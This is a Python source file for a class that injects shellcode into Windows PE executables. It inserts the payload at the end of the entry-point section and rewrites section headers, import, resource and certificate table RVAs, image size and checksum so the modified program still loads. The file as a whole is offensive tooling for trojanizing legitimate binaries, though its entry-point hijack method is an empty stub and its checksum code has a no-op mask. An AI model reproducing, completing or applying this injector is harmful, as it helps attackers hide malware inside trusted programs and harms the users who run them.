from Utils.Win32BinaryOffsetsAndSizes import Win32BinaryOffsetsAndSizes
from Utils.Win32BinaryUtils import Win32BinaryUtils
from Utils.MultiByteHandler import MultiByteHandler
from Utils.GenericConstants import GenericConstants

'''
1.Adjust size of code, Address of Entrypoint, Base of Code, Base of Data
2.Adjust size of image
3.Adjust RVAs:
    -Export Table
    -Import Table
    -Resource Table
    -Exception Table
    -CertificateTable
    -Base Relocation Table
    -Debug
    -Architecture Data
    -GlobalPtr
    -TLSTable
    -LoadConfigTable
    -BoundImport
    -ImportAddressTable
    -DelayImportDescriptor
    -CLRRuntimeHeader
Also, for each table, if it has RVAs, they must be adjusted.
4.Adjust section headers:
    1.For section containing shellcode:
        -Virtiual and Raw sizes must be adjusted
    2. For sections comming after the shellcode section:
        -Virtual RVA and Pointer to Raw Data must be adjusted



'''


class Win32BinaryModifier:

    def compute_padding_size_for_file_alignment(self, size_or_offset):
        file_alignment = MultiByteHandler.get_dword_given_offset(self.binary, self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_FILE_ALIGNMENT)
        mod_result = size_or_offset % file_alignment

        return (file_alignment - mod_result) if mod_result != 0x0 else 0x0

    def compute_padding_size_for_section_alignment(self, size_or_rva):
        section_alignment = MultiByteHandler.get_dword_given_offset(self.binary, self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_ALIGNMENT)
        mod_result = size_or_rva % section_alignment
        return (section_alignment - mod_result) if mod_result != 0x0 else 0x0

    def inject_shell_code_at_offset(self, offset):
        shell_code_size = len(self.shell_code)
        first_half = self.binary[0:offset]
        second_half = self.binary[offset:]
        first_half.extend(self.shell_code)
        first_half.extend(second_half)
        self.binary = first_half

    def modify_entrypoint(self):
        '''
            1.Modify entrypoint
            2.Adjust shellcode to take into account the RVA (relative addresses)
            3.Insert jmp at the end of shellcode to pass execution to legitimate binary
        '''
        pass


    def get_shell_code_aligned_to_file_alignment(self):
        entrypoint_rva_offset = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary, entrypoint_rva_offset)

        entrypoint_section_header_offset = Win32BinaryUtils.get_raw_offset_for_header_of_section_containing_given_rva(self.binary, self.header_offset, entrypoint_rva)[1]

        raw_section_size_offset = entrypoint_section_header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER
        raw_section_size = MultiByteHandler.get_dword_given_offset(self.binary, raw_section_size_offset)

        default_shell_code = self.shell_code_generator.get_shell_code()
        new_raw_section_size_unaligned = raw_section_size + len(default_shell_code)

        padding_size = self.compute_padding_size_for_file_alignment(new_raw_section_size_unaligned)
        return self.shell_code_generator.get_padded_shell_code(padding_size)



    '''
        Adjust:
        -Size of code
        -Address of entrypoint (RVA)
        -Base of code (RVA)
     '''
    def adjust_standard_coff_fields(self):

        # Set size of code
        size_of_code_offset = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SIZE_OF_CODE
        current_size_of_code = MultiByteHandler.get_dword_given_offset(self.binary, size_of_code_offset)
        MultiByteHandler.set_dword_given_offset(self.binary, size_of_code_offset, current_size_of_code + len(self.shell_code) + self.rva_delta)


        # Set base of code RVA: since i am inserting the shell code on the section containing the entrypoint, i must verify
        #whether the base of code is the section containing the entrypoint
        base_of_code_rva_offset_within_header = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_OF_CODE_RVA
        current_base_of_code_rva = MultiByteHandler.get_dword_given_offset(self.binary, base_of_code_rva_offset_within_header)

        entrypoint_rva_offset_within_header = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary, entrypoint_rva_offset_within_header)
        offset_of_header_of_section_containing_entrypoint = Win32BinaryUtils.get_raw_offset_for_header_of_section_containing_given_rva(self.binary, self.header_offset, entrypoint_rva)[1]
        entrypoint_section_rva = MultiByteHandler.get_dword_given_offset(self.binary,offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_VIRTUAL_ADDRESS_WITHIN_SECTION_HEADER)

        if current_base_of_code_rva > entrypoint_section_rva:
            MultiByteHandler.set_dword_given_offset(self.binary, base_of_code_rva_offset_within_header, current_base_of_code_rva + len(self.shell_code) + self.rva_delta)

        #This is better not to be here. The entrypoint should be the last thing to be changed..
        self.modify_entrypoint()

    '''
        Adjust:
        -Base of data
        -Size of image

    '''
    def adjust_windows_specific_headers(self):

        #Adjust base of data: must check whether this RVA is greater that the RVA of the section containing the shell code (section containing entrypoint).
        base_of_data_rva_offset_within_header = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_OF_DATA_RVA
        current_base_of_data = MultiByteHandler.get_dword_given_offset(self.binary, base_of_data_rva_offset_within_header)

        entrypoint_rva_offset_within_header = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary, entrypoint_rva_offset_within_header)
        offset_of_header_of_section_containing_entrypoint = Win32BinaryUtils.get_raw_offset_for_header_of_section_containing_given_rva(self.binary, self.header_offset, entrypoint_rva)[1]
        entrypoint_section_rva = MultiByteHandler.get_dword_given_offset(self.binary, offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_VIRTUAL_ADDRESS_WITHIN_SECTION_HEADER)

        if current_base_of_data > entrypoint_section_rva:
            MultiByteHandler.set_dword_given_offset(self.binary, base_of_data_rva_offset_within_header, current_base_of_data + len(self.shell_code) + self.rva_delta)


        # Sets size of image aligned to SectionAlignment
        size_of_image_offset = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SIZE_OF_IMAGE
        current_size_of_image = MultiByteHandler.get_dword_given_offset(self.binary, size_of_image_offset)
        unaligned_size_of_image = current_size_of_image + len(self.shell_code) + self.rva_delta
        aligned_size_of_image = unaligned_size_of_image + self.compute_padding_size_for_section_alignment(unaligned_size_of_image)

        MultiByteHandler.set_dword_given_offset(self.binary, size_of_image_offset, aligned_size_of_image)

    '''
        TODO: Consider the size for the resource table.
    '''
    def adjust_resource_table(self):
        offset_to_resource_table_rva_within_header = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_RESOURCE_TABLE_RVA
        resource_table_rva = MultiByteHandler.get_dword_given_offset(self.binary, offset_to_resource_table_rva_within_header)
        resource_table_raw_offset = Win32BinaryUtils.convert_rva_to_raw(self.binary, self.header_offset, resource_table_rva)

        offset_to_number_of_id_entries_within_resource_directory_type = resource_table_raw_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_ID_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER
        number_of_id_entries_within_resource_directory_type = MultiByteHandler.get_word_given_offset(self.binary, offset_to_number_of_id_entries_within_resource_directory_type)
        pointer_to_offset_to_directory_for_id_entry_within_resource_directory_type = offset_to_number_of_id_entries_within_resource_directory_type + 0x2
        offset_to_offset_to_directory_of_a_type_within_nameid = pointer_to_offset_to_directory_for_id_entry_within_resource_directory_type + 0x4

        for id_entry_within_resource_directory_type in range(0, number_of_id_entries_within_resource_directory_type):

            offset_to_directory_of_a_type_within_nameid = 0x7FFFFFFF & MultiByteHandler.get_dword_given_offset(self.binary, offset_to_offset_to_directory_of_a_type_within_nameid)
            offset_to_number_of_id_entries_within_nameid = resource_table_raw_offset + offset_to_directory_of_a_type_within_nameid + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_ID_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER
            number_of_id_entries_within_nameid = MultiByteHandler.get_word_given_offset(self.binary, offset_to_number_of_id_entries_within_nameid)
            offset_to_offset_of_id_offset_to_directory_for_id_entry_within_nameid = offset_to_number_of_id_entries_within_nameid + 0x2
            offset_to_offset_to_directory_within_language = offset_to_offset_of_id_offset_to_directory_for_id_entry_within_nameid + 0x4

            for id_entry_within_nameid_language in range(0, number_of_id_entries_within_nameid):

                offset_to_directory_of_a_type_within_language = 0x7FFFFFFF & MultiByteHandler.get_dword_given_offset(self.binary, offset_to_offset_to_directory_within_language)
                offset_to_offset_to_data_entry_within_data_entry = resource_table_raw_offset + offset_to_directory_of_a_type_within_language + Win32BinaryOffsetsAndSizes.OFFSET_TO_OFFSET_TO_DATA_ENTRY_WITHIN_LANGUAGE
                offset_to_data_entry_within_data_entry = 0x7FFFFFFF & MultiByteHandler.get_dword_given_offset(self.binary, offset_to_offset_to_data_entry_within_data_entry)
                offset_to_rva_within_data_entry = resource_table_raw_offset + offset_to_data_entry_within_data_entry
                rva_of_data = MultiByteHandler.get_dword_given_offset(self.binary, offset_to_rva_within_data_entry)
                MultiByteHandler.set_dword_given_offset(self.binary, offset_to_rva_within_data_entry, rva_of_data + len(self.shell_code) + self.rva_delta)
                offset_to_offset_to_directory_within_language += 0x8
            offset_to_offset_to_directory_of_a_type_within_nameid += 0x8

        #Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary, offset_to_resource_table_rva_within_header, resource_table_rva + len(self.shell_code) + self.rva_delta)

    '''
        1.Get size of import table. Compute number of entries.
        2.Adust RVAs within Import directory table:
            -Adjust import name table RVA
            -Adjust Name RVA
            -Adjust Import address table RVA

    '''
    def adjust_import_table(self):
        offset_to_import_table_rva = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_TABLE_RVA
        import_table_rva = MultiByteHandler.get_dword_given_offset(self.binary, offset_to_import_table_rva)
        import_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary, self.header_offset, import_table_rva)
        current_import_directory_table_entry = import_table_raw

        while(True):
            if not Win32BinaryUtils.is_end_of_import_directory_table(self.binary, current_import_directory_table_entry):
                break

            offset_to_import_name_table_rva = current_import_directory_table_entry + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_NAME_TABLE_RVA_WITHIN_IMPORT_DIRECTORY_TABLE
            import_name_table_rva = MultiByteHandler.get_dword_given_offset(self.binary, offset_to_import_name_table_rva)
            if import_name_table_rva != 0x0:
                MultiByteHandler.set_dword_given_offset(self.binary, offset_to_import_name_table_rva, import_name_table_rva + len(self.shell_code) + self.rva_delta)

            offset_to_name_rva = current_import_directory_table_entry + Win32BinaryOffsetsAndSizes.OFFSET_TO_NAME_RVA_WITHIN_IMPORT_DIRECTORY_TABLE
            name_rva = MultiByteHandler.get_dword_given_offset(self.binary, offset_to_name_rva)
            if name_rva != 0x0:
                MultiByteHandler.set_dword_given_offset(self.binary, offset_to_name_rva, name_rva + len(self.shell_code) + self.rva_delta)

            offset_to_import_address_table_rva = current_import_directory_table_entry + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_ADDRESS_TABLE_RVA_WITHIN_IMPORT_DIRECTORY_TABLE
            import_address_table_rva = MultiByteHandler.get_dword_given_offset(self.binary, offset_to_import_address_table_rva)
            if import_address_table_rva != 0x0:
                raw_offset_for_import_address_table = Win32BinaryUtils.convert_rva_to_raw(self.binary,self.header_offset,import_address_table_rva)
                while True:
                    hint_name_rva_or_ordinal = MultiByteHandler.get_dword_given_offset(self.binary,raw_offset_for_import_address_table)
                    if hint_name_rva_or_ordinal == 0x0:
                        break
                    if (0x80000000 & hint_name_rva_or_ordinal) != 0x80000000:
                        MultiByteHandler.set_dword_given_offset(self.binary, raw_offset_for_import_address_table, hint_name_rva_or_ordinal + len(self.shell_code) + self.rva_delta)
                    raw_offset_for_import_address_table += 0x4 #Each hint/name/ordinal takes 4 bytes (dword)

                MultiByteHandler.set_dword_given_offset(self.binary, offset_to_import_address_table_rva, import_address_table_rva + len(self.shell_code) + self.rva_delta)

            current_import_directory_table_entry += Win32BinaryOffsetsAndSizes.NUMBER_OF_BYTES_PER_IMPORT_DIRECTORY_TABLE_ENTRY

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary, offset_to_import_table_rva, import_table_rva + len(self.shell_code) + self.rva_delta)

    def adjust_certificate_table(self):

        offset_to_certificate_table_rva = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_CERTIFICATE_TABLE_RVA
        certificate_table_rva = MultiByteHandler.get_dword_given_offset(self.binary, offset_to_certificate_table_rva)

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary, offset_to_certificate_table_rva, certificate_table_rva + len(self.shell_code) + self.rva_delta)


    def adjust_data_directories(self):

        offset_to_import_table_rva_within_header = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_TABLE_RVA
        import_table_rva = MultiByteHandler.get_dword_given_offset(self.binary, offset_to_import_table_rva_within_header)
        if import_table_rva != 0x0 and Win32BinaryUtils.rva_requires_change(self.binary, self.header_offset, import_table_rva):
            self.adjust_import_table()


        offset_to_resource_section_rva_within_header = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_RESOURCE_TABLE_RVA
        resource_section_rva = MultiByteHandler.get_dword_given_offset(self.binary, offset_to_resource_section_rva_within_header)

        if resource_section_rva != 0x0 and Win32BinaryUtils.rva_requires_change(self.binary, self.header_offset, resource_section_rva):
            self.adjust_resource_table()

        offset_to_certificate_table_rva_within_header = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_CERTIFICATE_TABLE_RVA
        certificate_table_rva = MultiByteHandler.get_dword_given_offset(self.binary, offset_to_certificate_table_rva_within_header)

        if certificate_table_rva != 0x0 and Win32BinaryUtils.rva_requires_change(self.binary, self.header_offset, certificate_table_rva):
            self.adjust_certificate_table()

    '''
        1.Modify Virtual and Raw sizes of section containing shellcode
        2.Modify Virtual and RAW RVAs for sections coming after the section containing the shell code

    '''
    def adjust_section_headers(self):

        entrypoint_rva_offset_within_header = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary, entrypoint_rva_offset_within_header)
        section_header_index_and_offset = Win32BinaryUtils.get_raw_offset_for_header_of_section_containing_given_rva(self.binary, self.header_offset, entrypoint_rva)
        offset_of_header_of_section_containing_entrypoint = section_header_index_and_offset [1]


        # Set raw section size for shellcoded section
        raw_section_size_offset = offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER
        raw_section_size = MultiByteHandler.get_dword_given_offset(self.binary, raw_section_size_offset)
        raw_section_size += len(self.shell_code)
        MultiByteHandler.set_dword_given_offset(self.binary, raw_section_size_offset, raw_section_size)

        number_of_sections_offset = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_SECTIONS
        number_of_sections = MultiByteHandler.get_word_given_offset(self.binary, number_of_sections_offset)
        remaining_sections_after_shell_code_section = number_of_sections - (section_header_index_and_offset[0] + 1)

        # Moving to the next section header
        current_section_header_offset = offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.SECTION_HEADER_SIZE

        for section_index in range(0, remaining_sections_after_shell_code_section):

            virtual_section_rva_offset = current_section_header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_VIRTUAL_ADDRESS_WITHIN_SECTION_HEADER
            virtual_section_rva = MultiByteHandler.get_dword_given_offset(self.binary, virtual_section_rva_offset)
            virtual_section_rva += (len(self.shell_code) + self.rva_delta)

            MultiByteHandler.set_dword_given_offset(self.binary, virtual_section_rva_offset, virtual_section_rva)

            raw_section_offset_offset =  current_section_header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_ADDRESS_WITHIN_SECTION_HEADER
            raw_section_offset = MultiByteHandler.get_dword_given_offset(self.binary, raw_section_offset_offset)
            raw_section_offset += len(self.shell_code)
            MultiByteHandler.set_dword_given_offset(self.binary, raw_section_offset_offset, raw_section_offset)

            current_section_header_offset += Win32BinaryOffsetsAndSizes.SECTION_HEADER_SIZE

        '''
         Since the RVA for the first section after the one containing the shellcode may have suffered a change on its RVA, we need to extend the virtual size taking
         into account the next section RVA delta.
        '''
        virtual_section_size_offset = offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER
        virtual_section_size = MultiByteHandler.get_dword_given_offset(self.binary, virtual_section_size_offset)

        # Set virtual section size for shellcoded section
        virtual_section_size += (len(self.shell_code) + self.rva_delta)
        MultiByteHandler.set_dword_given_offset(self.binary, virtual_section_size_offset, virtual_section_size)

    def update_checksum(self):

        #Clear checksum
        image_checksum_offset = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_CHECKSUM
        checksum = MultiByteHandler.get_dword_given_offset(self.binary, image_checksum_offset)
        MultiByteHandler.set_dword_given_offset(self.binary, image_checksum_offset, 0x0)

        checksum = 0x0
        word_index = 0x0
        has_odd_byte = True if len(self.binary) % Win32BinaryOffsetsAndSizes.CHECKSUM_COMPUTATION_UNIT == 1 else False


        while word_index < len(self.binary):
            if word_index == image_checksum_offset:
                print("Reached checksum")
                word_index += Win32BinaryOffsetsAndSizes.CHECKSUM_SIZE
            else:
                checksum += MultiByteHandler.get_word_given_offset(self.binary, word_index)
                checksum & GenericConstants.DWORD_MASK
                #checksum += (checksum >> Win32BinaryOffsetsAndSizes.CHECKSUM_COMPUTATION_UNIT)
                word_index += Win32BinaryOffsetsAndSizes.CHECKSUM_COMPUTATION_UNIT

        if has_odd_byte:
            checksum += self.binary[-1]

        checksum = (checksum >> Win32BinaryOffsetsAndSizes.CHECKSUM_COMPUTATION_UNIT*GenericConstants.BITS_PER_BYTE) + (checksum & 0xFFFF)
        checksum += (checksum >> Win32BinaryOffsetsAndSizes.CHECKSUM_COMPUTATION_UNIT*GenericConstants.BITS_PER_BYTE)
        checksum = (checksum & 0xFFFF)
        checksum += len(self.binary)
        MultiByteHandler.set_dword_given_offset(self.binary,image_checksum_offset,checksum)

    '''
        RVAs for sections must be SectionAligned. I need to determined what is going to be the delta for the sections coming after
        the shellcode section so i can adjust headers and stuff properly.
    '''
    def set_rva_delta_for_section_alignment(self):
        entrypoint_rva_offset_within_header = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary, entrypoint_rva_offset_within_header)
        section_header_index_and_offset = Win32BinaryUtils.get_raw_offset_for_header_of_section_containing_given_rva(self.binary, self.header_offset, entrypoint_rva)
        offset_of_header_of_section_containing_entrypoint = section_header_index_and_offset[1]

        number_of_sections_offset = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_SECTIONS
        number_of_sections = MultiByteHandler.get_word_given_offset(self.binary, number_of_sections_offset)

        # Moving to the next section header
        current_section_header_offset = offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.SECTION_HEADER_SIZE


        virtual_section_rva_offset = current_section_header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_VIRTUAL_ADDRESS_WITHIN_SECTION_HEADER
        virtual_section_rva = MultiByteHandler.get_dword_given_offset(self.binary, virtual_section_rva_offset)
        virtual_rva_delta = self.compute_padding_size_for_section_alignment(virtual_section_rva + len(self.shell_code))

        # Since the sections are aligned on the original binary, the RVA delta should remain the same after the first computation.
        if virtual_rva_delta != 0x0:
            virtual_section_rva += virtual_rva_delta
            self.rva_delta += virtual_rva_delta

        current_section_header_offset += Win32BinaryOffsetsAndSizes.SECTION_HEADER_SIZE

    def modify_binary(self):

        #We must get the offsets for the location where the shellcode will be inserted before inserting it and before changing the headers.
        entrypoint_rva_offset_within_header = self.header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary, entrypoint_rva_offset_within_header)
        section_header_index_and_offset = Win32BinaryUtils.get_raw_offset_for_header_of_section_containing_given_rva(self.binary, self.header_offset, entrypoint_rva)
        offset_of_header_of_section_containing_entrypoint = section_header_index_and_offset[1]

        raw_section_offset_offset = offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_ADDRESS_WITHIN_SECTION_HEADER
        raw_section_offset = MultiByteHandler.get_dword_given_offset(self.binary, raw_section_offset_offset)

        raw_section_size_offset = offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER
        raw_section_size = MultiByteHandler.get_dword_given_offset(self.binary, raw_section_size_offset)

        self.shell_code = self.get_shell_code_aligned_to_file_alignment()
        self.set_rva_delta_for_section_alignment()
        self.adjust_data_directories()
        self.adjust_section_headers()

        self.adjust_standard_coff_fields()
        self.adjust_windows_specific_headers()

        self.inject_shell_code_at_offset(raw_section_offset + raw_section_size)

        self.update_checksum()



    def get_result(self):
        return self.binary

    def set_binary(self, binary):
        self.binary = binary
        self.header_offset = MultiByteHandler.get_dword_given_offset(binary, Win32BinaryOffsetsAndSizes.OFFSET_TO_PE_HEADER_OFFSET)

        '''
            Sections must be aligned to SectionAlignment. As such, all the sections coming after the extended section must have their RVAs adjusted to be aligned
            with the section. This variable olds the delta added to the RVAs.
        '''
        self.rva_delta = 0

    def set_shell_code_generator(self, shell_code_generator):
        self.shell_code_generator = shell_code_generator


    def __init__(self):
       pass



